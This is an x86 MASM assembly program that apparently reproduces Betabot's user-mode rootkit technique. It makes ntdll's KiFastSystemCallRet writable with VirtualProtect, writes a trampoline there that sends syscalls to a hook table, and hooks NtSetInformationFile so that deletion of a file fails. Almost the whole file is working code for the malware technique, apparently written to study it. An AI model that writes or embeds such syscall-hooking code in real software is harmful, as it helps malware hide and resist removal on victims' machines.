; Writing our trampoline right after KiFastSystemCallRet 
; as Betabot does.

.386
.model flat,stdcall
option casemap:none

include kernel32.inc
includelib kernel32.lib

.data

oldProtection dd ? 

fileToDelete db "C:\Temp\deleteMe.txt", 0 ; Create this file or change the path and check if it was deleted.

; Array listing all the hooks we install.
; Each hook is placed according to its function's syscall number.
arrayOfEvil DWORD 149h DUP (0), offset newNtSetInformationFile , 40h DUP (0)

.code

start:
	mov esi, 07FFE0300h
	lodsd 						; EAX = KiFastSystemCall
	call changeProtection		; Not changing the protection back is bad for your health
	mov edx, 03EBh				; 0xEB06 JMP SHORT 0xE bytes
	mov [eax], edx
	
	lea eax, [eax + 5h]			; EAX = [KiFastSystemCallRet + 1]
	mov dl, 68h					; 0x68 = PUSH
	mov [eax], dl
	
	inc eax
	
	mov edx, offset evilCode	; EDX = Pointer to our trap
	mov [eax], edx				; [KiFastSystemCallRet] = PUSH offset evilCode
	
	lea eax, [eax + 4]	
	mov dl, 0C3h				; 0xC3 = RETN
	mov [eax], dl
	
	push offset fileToDelete
	call DeleteFile				; Will call NtSetInformationFile
	
	retn
	
	
	changeProtection:
		push eax					; Save KiFastSYstemCall addr
		push offset oldProtection
		push 40h					; PAGE_EXECUTE_READWRITE
		push 0Ah					
		push eax
		call VirtualProtect			; VirutalProtect((void *)KiFastSystemCall, 10, PAGE_EXECUTE_READWRITE, &oldProtection
		pop eax
		retn
	
	evilCode:
		mov ecx, offset arrayOfEvil
		lea ecx, [ecx + eax * 4]
		mov ebx, [ecx]
		cmp ebx, 0
		jz origKiFastSystemCall
		jmp ebx
		
	newNtSetInformationFile:
		pushad
		mov edi, [esp + 38h]
		cmp edi, 0Dh				; 0xD = FileDispositionInformation
		jnz callRealKiFastSystemCall
		xor edi, edi
		mov ebx, [esp + 30h]		; EBX = (VOID *)dispositionInfo
		mov [ebx], dl				; dispositionInfo.DeleteFile = 0 (FALSE)
	callRealKiFastSystemCall:
		popad	
		jmp origKiFastSystemCall
		
	origKiFastSystemCall:
		mov edx, esp
		dw 340fh 					; SYSENTER
		retn

end start